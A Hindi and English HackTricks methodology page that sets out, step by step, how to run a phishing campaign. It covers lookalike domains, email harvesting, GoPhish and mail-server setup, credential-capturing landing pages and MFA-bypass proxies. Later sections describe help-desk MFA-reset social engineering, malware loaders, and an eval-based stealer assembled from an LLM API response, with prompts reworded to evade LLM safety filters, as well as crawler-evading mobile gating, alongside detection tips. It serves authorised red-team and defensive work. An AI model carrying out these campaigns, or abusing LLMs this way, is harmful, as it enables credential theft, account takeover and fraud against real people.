# Phishing पद्धति

{{#include ../../banners/hacktricks-training.md}}

## पद्धति

1. लक्षित की Recon करें
1. **victim domain** चुनें।
2. लक्षित द्वारा उपयोग किए जाने वाले **login portals** की तलाश करने के लिए कुछ basic **web enumeration** करें और तय करें कि आप किसे **impersonate** करेंगे।
3. कुछ **OSINT** का उपयोग करके **find emails** करें।
2. पर्यावरण तैयार करें
1. आप जिस phishing assessment के लिए उपयोग करने जा रहे हैं, उसके लिए **Buy the domain**
2. संबंधित रिकॉर्ड्स (SPF, DMARC, DKIM, rDNS) को सेट करते हुए **email service को Configure करें**
3. **gophish** के साथ VPS Configure करें
3. अभियान तैयार करें
1. **email template** तैयार करें
2. credentials चुराने के लिए **web page** तैयार करें
4. अभियान लॉन्च करें!

## समान domain नाम जेनरेट करें या विश्वसनीय domain खरीदें

### Domain Name वैरिएशन तकनीकें

- **Keyword**: मूल domain का एक महत्वपूर्ण **keyword** domain नाम में **contains** होता है (उदा., zelster.com-management.com).
- **hypened subdomain**: किसी सबडोमेन के लिए डॉट को हाइफन में बदलें (उदा., www-zelster.com).
- **New TLD**: समान domain पर नया TLD उपयोग करें (उदा., zelster.org)
- **Homoglyph**: domain नाम में एक अक्षर को ऐसे अक्षरों से **replaces** करें जो दिखने में समान हों (उदा., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** domain नाम के भीतर दो अक्षरों को **swaps** किया जाता है (उदा., zelsetr.com).
- **Singularization/Pluralization**: domain नाम के अंत में “s” जोड़ना या हटाना (उदा., zeltsers.com).
- **Omission**: domain नाम में से एक अक्षर **removes** करना (उदा., zelser.com).
- **Repetition:** domain नाम में किसी अक्षर को **repeats** करना (उदा., zeltsser.com).
- **Replacement**: homoglyph जैसा पर कम छुपा हुआ। यह domain नाम के किसी अक्षर को बदल देता है, संभवतः कीबोर्ड पर मूल अक्षर के पास के अक्षर से (उदा., zektser.com).
- **Subdomained**: domain नाम के अंदर एक **dot** introduce करना (उदा., ze.lster.com).
- **Insertion**: domain नाम में एक अक्षर **inserts** करना (उदा., zerltser.com).
- **Missing dot**: TLD को domain नाम के साथ जोड़ना (उदा., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

इस बात की **संभावना है कि संचित या संचारित कुछ bits स्वचालित रूप से फ्लिप हो सकते हैं**—सौर उभार, cosmic rays, या हार्डवेयर त्रुटियों जैसी विभिन्न कारकों के कारण।

जब इस अवधारणा को **DNS requests** पर लागू किया जाता है, तो संभव है कि **DNS server द्वारा प्राप्त domain** वही न हो जो प्रारंभ में अनुरोधित किया गया था।

उदाहरण के लिए, domain "windows.com" में एक single bit modification इसे "windnws.com" में बदल सकता है।

Attackers इस स्थिति का फायदा उठाकर victim के domain से मिलते-जुलते कई bit-flipping domains register कर सकते हैं। उनका उद्देश्य वैध उपयोगकर्ताओं को अपनी infrastructure पर redirect करना होता है।

अधिक जानकारी के लिए पढ़ें [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### विश्वसनीय domain खरीदें

आप [https://www.expireddomains.net/](https://www.expireddomains.net) में एक expired domain खोज सकते हैं जिसका आप उपयोग कर सकते हैं.\
यह सुनिश्चित करने के लिए कि आप जो expired domain खरीदने जा रहे हैं उसमें पहले से ही अच्छा SEO है, आप उसके वर्गीकरण की जाँच कर सकते हैं:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## ईमेल खोजना

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

अधिक मान्य ईमेल पते discover करने या जिन ईमेल पतों की आपने पहले ही खोज कर ली है उन्हें verify करने के लिए आप चेक कर सकते हैं कि क्या आप victim के smtp servers को brute-force कर सकते हैं। [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
इसके अलावा, यह न भूलें कि यदि users अपने mails तक पहुँचने के लिए **कोई web portal** उपयोग करते हैं, तो आप जांच सकते हैं कि क्या वह **username brute force** के प्रति vulnerable है, और संभव हो तो उस vulnerability का exploit करें।

## GoPhish कॉन्फ़िगर करना

### Installation

आप इसे डाउनलोड कर सकते हैं: [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

इसे `/opt/gophish` के अंदर डाउनलोड और decompress करें और `/opt/gophish/gophish` को execute करें\
आउटपुट में आपको port 3333 पर admin user के लिए एक password दिया जाएगा। इसलिए उस पोर्ट पर पहुँचें और admin password बदलने के लिए उन credentials का उपयोग करें। आपको वह पोर्ट local पर tunnel करने की आवश्यकता हो सकती है:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**TLS प्रमाणपत्र कॉन्फ़िगरेशन**

इस चरण से पहले आपके पास वह **पहले से खरीदा हुआ डोमेन** होना चाहिए जिसे आप उपयोग करने जा रहे हैं और यह उस **VPS का IP** की ओर **इशारा कर रहा होना चाहिए** जहाँ आप **gophish** कॉन्फ़िगर कर रहे हैं।
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**मेल कॉन्फ़िगरेशन**

इंस्टॉल करना शुरू करें: `apt-get install postfix`

फिर डोमेन को निम्न फ़ाइलों में जोड़ें:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf के अंदर नीचे दिए गए वेरिएबल्स के मान भी बदलें**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

अंत में फ़ाइलें **`/etc/hostname`** और **`/etc/mailname`** को अपने डोमेन नाम से बदलें और **अपने VPS को रिस्टार्ट करें।**

अब, `mail.<domain>` का एक **DNS A record** बनाएं जो VPS के **ip address** की ओर इशारा करे और `mail.<domain>` की ओर इशारा करने वाला एक **DNS MX** record बनाएं

अब ईमेल भेजने का परीक्षण करें:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish कॉन्फ़िगरेशन**

gophish का निष्पादन रोकें और इसे कॉन्फ़िगर करें।\\
निम्नानुसार `/opt/gophish/config.json` को संशोधित करें (https के उपयोग पर ध्यान दें):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish सेवा कॉन्फ़िगर करें**

gophish सेवा बनाने के लिए ताकि इसे स्वतः प्रारंभ किया जा सके और एक सेवा के रूप में प्रबंधित किया जा सके, आप फ़ाइल `/etc/init.d/gophish` निम्न सामग्री के साथ बना सकते हैं:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
सेवा का कॉन्फ़िगरेशन पूरा करें और इसे जांचने के लिए निम्न करें:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## मेल सर्वर और डोमेन को कॉन्फ़िगर करना

### प्रतीक्षा करें और वैध बने रहें

जितना पुराना डोमेन होगा, उसे spam के रूप में पकड़े जाने की संभावना उतनी कम होगी। इसलिए phishing assessment से पहले जितना संभव हो सके उतना समय (कम से कम 1 सप्ताह) प्रतीक्षा करें। इसके अलावा, अगर आप किसी प्रतिष्ठा-संबंधी पेज को डालते हैं तो मिलने वाली प्रतिष्ठा बेहतर होगी।

ध्यान दें कि भले ही आपको एक सप्ताह तक प्रतीक्षा करनी पड़े, आप अब ही सब कुछ कॉन्फ़िगर कर सकते हैं।

### Reverse DNS (rDNS) रिकॉर्ड कॉन्फ़िगर करें

VPS के IP पते को डोमेन नाम पर रिज़ॉल्व करने वाला rDNS (PTR) रिकॉर्ड सेट करें।

### Sender Policy Framework (SPF) रिकॉर्ड

आपको **नए डोमेन के लिए SPF रिकॉर्ड कॉन्फ़िगर करना होगा**। यदि आप नहीं जानते कि SPF रिकॉर्ड क्या है [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

आप [https://www.spfwizard.net/](https://www.spfwizard.net) का उपयोग अपनी SPF नीति जेनरेट करने के लिए कर सकते हैं (VPS मशीन का IP उपयोग करें)

![](<../../images/image (1037).png>)

यह वह सामग्री है जिसे डोमेन के TXT रिकॉर्ड में सेट करना चाहिए:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### डोमेन-आधारित संदेश प्रमाणीकरण, रिपोर्टिंग और अनुरूपता (DMARC) रिकॉर्ड

आपको **नए डोमेन के लिए DMARC रिकॉर्ड कॉन्फ़िगर करना होगा**। यदि आप नहीं जानते कि DMARC रिकॉर्ड क्या है तो [**यह पृष्ठ पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

आपको होस्टनाम `_dmarc.<domain>` की ओर इशारा करते हुए एक नया DNS TXT रिकॉर्ड बनाना होगा, जिसमें निम्नलिखित सामग्री हो:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

आपको नए डोमेन के लिए **DKIM कॉन्फ़िगर करना चाहिए**। अगर आप नहीं जानते कि DMARC record क्या है तो [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> आपको DKIM key द्वारा जनरेट किए गए दोनों B64 मानों को जोड़ना होगा:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### अपने ईमेल कॉन्फ़िगरेशन का स्कोर जाँचें

आप यह [https://www.mail-tester.com/](https://www.mail-tester.com/)\ का उपयोग करके कर सकते हैं।\
बस पेज खोलें और जो एड्रेस वे देते हैं उस पर एक ईमेल भेजें:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
आप अपना **ईमेल कॉन्फ़िगरेशन जांच सकते हैं** `check-auth@verifier.port25.com` पर एक ईमेल भेजकर और **प्रतिक्रिया पढ़कर** (इसके लिए आपको **खोलना** port **25** होगा और यदि आप ईमेल root के रूप में भेजते हैं तो फाइल _/var/mail/root_ में प्रतिक्रिया देखनी होगी).\
सुनिश्चित करें कि आप सभी परीक्षण पास कर रहे हैं:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
आप अपने नियंत्रण वाले **Gmail पर संदेश** भी भेज सकते हैं, और अपने Gmail इनबॉक्स में **ईमेल के हेडर्स** की जाँच करें, `dkim=pass` को `Authentication-Results` header field में मौजूद होना चाहिए।
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) आपको बता सकता है कि क्या आपका domain spamhouse द्वारा ब्लॉक किया जा रहा है। आप अपने domain/IP को हटाने का अनुरोध कर सकते हैं: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​आप अपने domain/IP को हटाने का अनुरोध कर सकते हैं: [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- प्रेषक प्रोफ़ाइल की पहचान के लिए कोई **नाम** सेट करें
- तय करें कि आप किस account से phishing emails भेजने वाले हैं। सुझाव: _noreply, support, servicedesk, salesforce..._
- आप username और password खाली छोड़ सकते हैं, लेकिन सुनिश्चित करें कि **Ignore Certificate Errors** को चेक किया गया हो

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> यह सुझाव दिया जाता है कि सब कुछ काम कर रहा है यह जांचने के लिए "**Send Test Email**" फ़ंक्शनैलिटी का उपयोग करें।\
> मैं सुझाव दूँगा कि परीक्षण करते समय blacklisted होने से बचने के लिए आप **test emails को 10min mails addresses पर भेजें**।

### Email Template

- टेम्पलेट की पहचान के लिए कोई **नाम** सेट करें
- फिर एक **subject** लिखें (कुछ अजीब नहीं, बस कुछ ऐसा जो आप सामान्य ईमेल में पढ़ने की उम्मीद कर सकते हैं)
- सुनिश्चित करें कि आपने "**Add Tracking Image**" को चेक किया है
- **email template** लिखें (आप नीचे दिए गए उदाहरण जैसा variables उपयोग कर सकते हैं):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **in order to increase the credibility of the email**, it's recommended to use some signature from an email from the client. Suggestions:

- Send an email to a **non existent address** and check if the response has any signature.
- Search for **public emails** like info@ex.com or press@ex.com or public@ex.com and send them an email and wait for the response.
- Try to contact **some valid discovered** email and wait for the response

![](<../../images/image (80).png>)

> [!TIP]
> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Write a **name**
- **Write the HTML code** of the web page. Note that you can **import** web pages.
- Mark **Capture Submitted Data** and **Capture Passwords**
- Set a **redirection**

![](<../../images/image (826).png>)

> [!TIP]
> Usually you will need to modify the HTML code of the page and make some tests in local (maybe using some Apache server) **until you like the results.** Then, write that HTML code in the box.\
> Note that if you need to **use some static resources** for the HTML (maybe some CSS and JS pages) you can save them in _**/opt/gophish/static/endpoint**_ and then access them from _**/static/\<filename>**_

> [!TIP]
> For the redirection you could **redirect the users to the legit main web page** of the victim, or redirect them to _/static/migration.html_ for example, put some **spinning wheel (**[**https://loading.io/**](https://loading.io)**) for 5 seconds and then indicate that the process was successful**.

### Users & Groups

- Set a name
- **Import the data** (note that in order to use the template for the example you need the firstname, last name and email address of each user)

![](<../../images/image (163).png>)

### Campaign

Finally, create a campaign selecting a name, the email template, the landing page, the URL, the sending profile and the group. Note that the URL will be the link sent to the victims

Note that the **Sending Profile allow to send a test email to see how will the final phishing email looks like**:

![](<../../images/image (192).png>)

> [!TIP]
> I would recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.

Once everything is ready, just launch the campaign!

## Website Cloning

If for any reason you want to clone the website check the following page:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In some phishing assessments (mainly for Red Teams) you will want to also **send files containing some kind of backdoor** (maybe a C2 or maybe just something that will trigger an authentication).\
Check out the following page for some examples:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

The previous attack is pretty clever as you are faking a real website and gathering the information set by the user. Unfortunately, if the user didn't put the correct password or if the application you faked is configured with 2FA, **this information won't allow you to impersonate the tricked user**.

This is where tools like [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) and [**muraena**](https://github.com/muraenateam/muraena) are useful. This tool will allow you to generate a MitM like attack. Basically, the attacks works in the following way:

1. You **impersonate the login** form of the real webpage.
2. The user **send** his **credentials** to your fake page and the tool send those to the real webpage, **checking if the credentials work**.
3. If the account is configured with **2FA**, the MitM page will ask for it and once the **user introduces** it the tool will send it to the real web page.
4. Once the user is authenticated you (as attacker) will have **captured the credentials, the 2FA, the cookie and any information** of every interaction your while the tool is performing a MitM.

### Via VNC

What if instead of **sending the victim to a malicious page** with the same looks as the original one, you send him to a **VNC session with a browser connected to the real web page**? You will be able to see what he does, steal the password, the MFA used, the cookies...\
You can do this with [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Obviously one of the best ways to know if you have been busted is to **search your domain inside blacklists**. If it appears listed, somehow your domain was detected as suspicions.\
One easy way to check if you domain appears in any blacklist is to use [https://malwareworld.com/](https://malwareworld.com)

However, there are other ways to know if the victim is **actively looking for suspicions phishing activity in the wild** as explained in:


{{#ref}}
detecting-phising.md
{{#endref}}

You can **buy a domain with a very similar name** to the victims domain **and/or generate a certificate** for a **subdomain** of a domain controlled by you **containing** the **keyword** of the victim's domain. If the **victim** perform any kind of **DNS or HTTP interaction** with them, you will know that **he is actively looking** for suspicious domains and you will need to be very stealth.

### Evaluate the phishing

Use [**Phishious** ](https://github.com/Rices/Phishious)to evaluate if your email is going to end in the spam folder or if it's going to be blocked or successful.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets increasingly skip email lures entirely and **directly target the service-desk / identity-recovery workflow** to defeat MFA.  The attack is fully "living-off-the-land": once the operator owns valid credentials they pivot with built-in admin tooling – no malware is required.

### Attack flow
1. Recon the victim
* Harvest personal & corporate details from LinkedIn, data breaches, public GitHub, etc.
* Identify high-value identities (executives, IT, finance) and enumerate the **exact help-desk process** for password / MFA reset.
2. Real-time social engineering
* Phone, Teams or chat the help-desk while impersonating the target (often with **spoofed caller-ID** or **cloned voice**).
* Provide the previously-collected PII to pass knowledge-based verification.
* Convince the agent to **reset the MFA secret** or perform a **SIM-swap** on a registered mobile number.
3. Immediate post-access actions (≤60 min in real cases)
* Establish a foothold through any web SSO portal.
* Enumerate AD / AzureAD with built-ins (no binaries dropped):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement with **WMI**, **PsExec**, or legitimate **RMM** agents already whitelisted in the environment.

### Detection & Mitigation
* Treat help-desk identity recovery as a **privileged operation** – require step-up auth & manager approval.
* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules that alert on:
* MFA method changed + authentication from new device / geo.
* Immediate elevation of the same principal (user-→-admin).
* Record help-desk calls and enforce a **call-back to an already-registered number** before any reset.
* Implement **Just-In-Time (JIT) / Privileged Access** so newly reset accounts do **not** automatically inherit high-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews offset the cost of high-touch ops with mass attacks that turn **search engines & ad networks into the delivery channel**.

1. **SEO poisoning / malvertising** pushes a fake result such as `chromium-update[.]site` to the top search ads.
2. Victim downloads a small **first-stage loader** (often JS/HTA/ISO).  Examples seen by Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltrates browser cookies + credential DBs, then pulls a **silent loader** which decides – *in realtime* – whether to deploy:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Block newly-registered domains & enforce **Advanced DNS / URL Filtering** on *search-ads* as well as e-mail.
* Restrict software installation to signed MSI / Store packages, deny `HTA`, `ISO`, `VBS` execution by policy.
* Monitor for child processes of browsers opening installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt for LOLBins frequently abused by first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).

---

## AI-Enhanced Phishing Operations
Attackers now chain **LLM & voice-clone APIs** for fully personalised lures and real-time interaction.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Add **dynamic banners** highlighting messages sent from untrusted automation (via ARC/DKIM anomalies).
• Deploy **voice-biometric challenge phrases** for high-risk phone requests.
• Continuously simulate AI-generated lures in awareness programmes – static templates are obsolete.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate wording to bypass safety filters and reduce hallucinations.
2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
3. **Assemble & exec:** concatenate the response and execute it (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** जनरेट किया गया कोड प्रलोभन को व्यक्तिगत बनाता है (उदा., LogoKit token parsing) और prompt-hidden endpoint पर creds पोस्ट करता है।

**एवेशन विशेषताएँ**
- ट्रैफ़िक प्रसिद्ध LLM डोमेनों या विश्वसनीय CDN प्रॉक्सियों तक जाता है; कभी-कभी WebSockets के माध्यम से backend तक।
- कोई स्थिर payload नहीं; malicious JS केवल render के बाद ही मौजूद होता है।
- गैर-नियतात्मक जनरेशन प्रत्येक सत्र के लिए **unique** stealers बनाते हैं।

**डिटेक्शन विचार**
- JS सक्षम sandboxes चलाएँ; **runtime `eval`/dynamic script creation sourced from LLM responses** को flag करें।
- front-end POSTs to LLM APIs के तुरंत बाद returned text पर `eval`/`Function` चलने के मामलों की खोज करें।
- क्लाइंट ट्रैफ़िक में अनधिकृत LLM डोमेनों पर और उसके बाद होने वाले credential POSTs पर alert करें।

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
क्लासिक push-bombing के अलावा, ऑपरेटर्स हेल्प‑डेस्क कॉल के दौरान बस **force a new MFA registration** करते हैं, जिससे उपयोगकर्ता का existing token निष्क्रिय हो जाता है। उसके बाद आने वाला कोई भी लॉगिन प्रॉम्प्ट शिकार के लिए वैध दिखाई देता है।
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **within minutes from the same IP**.

## Clipboard Hijacking / Pastejacking

हमलावर compromised या typosquatted वेब पेज से शिकार के clipboard में चुपचाप malicious commands कॉपी कर सकते हैं और फिर उपयोगकर्ता को धोखा देकर उन्हें **Win + R**, **Win + X** या terminal विंडो में paste करवा देते हैं, जिससे बिना किसी download या attachment के arbitrary code execute हो सकता है।

{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
Operators अक्सर अपने phishing flows को एक साधारण device check के पीछे छुपा देते हैं ताकि desktop crawlers कभी final pages तक न पहुँचें। एक सामान्य पैटर्न एक छोटा सा script होता है जो touch-capable DOM का परीक्षण करता है और परिणाम को server endpoint पर पोस्ट करता है; non‑mobile clients को HTTP 500 (या एक blank page) मिलता है, जबकि mobile users को पूरा flow सर्व किया जाता है।

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` लॉजिक (सरलीकृत):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
सर्वर व्यवहार अक्सर देखा गया:
- पहली लोड के दौरान session cookie सेट करता है।
- स्वीकार करता है `POST /detect {"is_mobile":true|false}`।
- पर `is_mobile=false` होने पर subsequent GETs को 500 (या placeholder) लौटाता है; केवल `true` होने पर phishing परोसता है।

Hunting and detection heuristics:
- urlscan क्वेरी: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → non‑mobile के लिए HTTP 500 का क्रम; वैध mobile victim paths 200 लौटाते हैं और आगे का HTML/JS प्रदान करते हैं।
- उन पेजों को ब्लॉक या कड़ी जाँच करें जो सामग्री को विशेष रूप से `ontouchstart` या समान device checks पर निर्भर करते हैं।

रक्षा युक्तियाँ:
- गेटेड कंटेंट प्रकट करने के लिए crawlers को mobile‑जैसी fingerprints और JS सक्षम करके चलाएँ।
- नए पंजीकृत डोमेनों पर `POST /detect` के बाद संदिग्ध 500 प्रतिक्रियाओं पर अलर्ट करें।

## संदर्भ

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
